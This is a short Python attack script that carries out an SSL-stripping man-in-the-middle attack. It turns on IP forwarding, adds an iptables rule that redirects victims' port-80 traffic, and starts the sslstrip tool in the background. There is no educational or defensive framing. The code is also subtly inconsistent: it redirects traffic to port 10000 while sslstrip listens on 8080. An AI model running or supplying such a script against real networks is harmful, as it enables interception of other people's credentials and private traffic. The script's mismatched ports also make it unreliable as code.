import os

class SSLStrip:
	
	def strip(self):
		try:
			print("Performing SSL strip now...")
			
			os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
			os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
			os.system('sslstrip -l 8080 &> /dev/null &')
		except KeyboardInterrupt:
			print("Stopping SSL strip.")

if __name__ == '__main__':
    ssl = SSLStrip()
    ssl.strip()

